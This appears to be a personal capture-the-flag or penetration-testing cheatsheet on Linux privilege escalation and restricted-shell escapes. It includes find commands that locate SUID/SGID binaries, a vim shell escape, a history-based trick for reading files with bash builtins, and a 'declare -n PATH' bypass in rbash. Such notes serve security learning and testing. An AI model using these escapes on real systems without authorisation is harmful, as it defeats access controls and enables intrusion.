# Pwn

## Privilege escalation

This page has a great summary/cheatsheet of many different things to try when we have already a shell: [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/). Specially things like `sudo -l` to list what you can do, or searching for files with _advanced_ Linux file permissions (`SUID`, `GUID`):

```
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
```

## Escaping a restricted shell

This is a well-known escape using `vim`:

```
:set shell=/bin/bash
:shell
```

With `rvim`, that doesn't allow the previous escape, it might still be possible to run code using `:python` or `:lua` modules. To list installed features use `:version`. 

Trick to read a file using only bash builtins (which are normally available in `rbash`):
```
function r() { history -c; export HISTSIZE=0; export HISTSIZE=10000; history -r $1; history; }
```

Normally on restricted shells `SHELL` and `PATH` variables are declared as read only (`-rx`). If they were writeable then we would be done escaping, since `SHELL` would allow us to swtich to the shell of our choice, and `PATH` could be set to any directory we want to execute files without `/`.  However, it turns out variables can be declared as something else in `rbash`: integer (`declare -i`), array (`declare -a`), associative array (`declare -A`) and _reference to the variable named by its value_. This could allow to write to `PATH` (or rather, to the variable defined by its value, which is a weirdly named variable, but valid it seems):

```
$ declare -n PATH
$ export PATH=/target
$ export
declare -x /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games="/target"
declare -nrx PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
...
```
